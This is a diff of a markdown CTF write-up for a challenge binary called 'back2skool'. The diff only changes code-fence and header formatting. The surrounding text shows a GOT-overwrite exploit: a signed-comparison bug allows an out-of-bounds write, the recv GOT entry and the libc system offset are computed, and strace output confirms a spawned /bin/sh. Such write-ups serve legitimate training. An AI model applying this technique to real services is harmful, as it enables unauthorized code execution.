@@ -184,7 +184,7 @@ find more on this [wiki
 article](http://en.wikibooks.org/wiki/X86_Assembly/Control_Flow#Jump_if_Less).
 Probably the original code looks something like this:
 
-~~~ cpp
+``` cpp
 int i;
 i = atoi(str);
 if (i > 9) {
@@ -192,7 +192,7 @@ if (i > 9) {
 	exit();
 }
 do_stuff;
-~~~
+```
 
 One way to correct the above code is to have an unsigned comparison or check
 for negative values. Both would work in this case, but then we couldn't solve
@@ -364,7 +364,7 @@ The instruction pointer is the value that we wrote, 0x11111111 in decimal is
 **286331153**, so we've managed to modify the flow of the program by doing a
 write, and we've managed to do so in a predictable way.
 
-##Second PoC
+## Second PoC
 
 We are in the following state: we've managed to make our program to jump at
 any location. But **where** to jump? Because we don't have any possibility of
@@ -396,11 +396,11 @@ compute the offset of an unused function**.
   function which has been previously called. We will choose `recv` for this
   purpose.
 
-~~~ bash
+``` bash
 $ objdump -dS ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f  | grep -A2 recv@plt
 08048980 <recv@plt>:
  8048980:	ff 25 c0 bf 04 08    	jmp    *0x804bfc0
-~~~
+```
 
 **0x804bfc0** is the GOT entry for `recv` function.
 
@@ -411,14 +411,14 @@ $ objdump -dS ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f  | grep -A2 
   exploiting locally - meaning that we have access to our libc file. To
   compute the offset we only have to find the function entries in libc.
 
-~~~ bash
+``` bash
 $ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep ' recv@'
   1124: 000cebf0   118 FUNC    WEAK   DEFAULT   12 recv@@GLIBC_2.0
 $ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep ' system@'
   1398: 00039100   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
 $ echo $((0x00039100-0x000cebf0))
 -613104
-~~~
+```
 
 The offset is -613104, **note** that it depends on the version of libc, hence
 the exploit isn't too reliable. Let's focus though on exploiting locally and
@@ -426,7 +426,7 @@ postpone the computation of the remote offset. We will write at the same
 address as in PoC1 but we will write the value of `system` function i.e.
 `address_of_recv_function+OFFSET`.
 
-~~~ bash
+``` bash
 $ telnet localhost 31337
 read
 Input position to read from:
@@ -440,7 +440,7 @@ Input numeric value to write:
 Value at position -2147483634: -1218309888
 math
 Result of math: -1
-~~~
+```
 
 Reading from `-32` it's equivalent of reading `-32*4` bytes before our
 buffer. `0x804c040-32*4` is `0x804bfc0`, this is the `recv` GOT entry.
@@ -448,7 +448,7 @@ buffer. `0x804c040-32*4` is `0x804bfc0`, this is the `recv` GOT entry.
 
 Hey, it didn't crashed, that's a plus! Meanwhile, back at the castle.
 
-~~~ bash
+``` bash
 $ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
 [...]
 [pid  4901] send(4, "Value at position -2147483634: -"..., 43, 0) = 43
@@ -462,7 +462,7 @@ $ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
 [pid  4902] execve("/bin/sh", ["sh", "-c", ""], [/* 31 vars */]) = 0
 [pid  4902] brk(0)                      = 0x9a04000
 [...]
-~~~
+```
 
 We successfully **called `execve`**!
 
